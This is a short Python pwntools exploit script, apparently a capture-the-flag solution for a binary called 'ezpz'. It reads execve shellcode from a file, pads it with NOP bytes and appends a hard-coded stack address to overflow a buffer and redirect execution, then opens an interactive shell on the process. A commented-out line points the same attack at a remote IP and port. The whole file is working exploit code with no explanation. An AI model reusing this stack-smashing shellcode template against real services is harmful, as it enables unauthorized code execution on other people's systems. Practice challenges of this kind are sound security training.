from pwn import *

context.arch='amd64'
e = ELF('/mnt/c/Users/zahar/Downloads/ezpz')
p = process('/mnt/c/Users/zahar/Downloads/ezpz')
# p = gdb.debug('/mnt/c/Users/zahar/Downloads/ezpz')
# p = remote('3.110.66.92', '31499')

with open('./shellcodes/execve', 'rb') as f:
    f = f.read()
stack_addr = 0x7fffffffdcc0

payload = f + (40 - len(f)) * b'\x90' + p64(stack_addr)

p.recvuntil(b'\n', timeout=1)
# win_addr = p64(e.symbols['win'])
# ret = p64(0x40188E)

print(payload)
p.sendline(payload)

p.interactive()
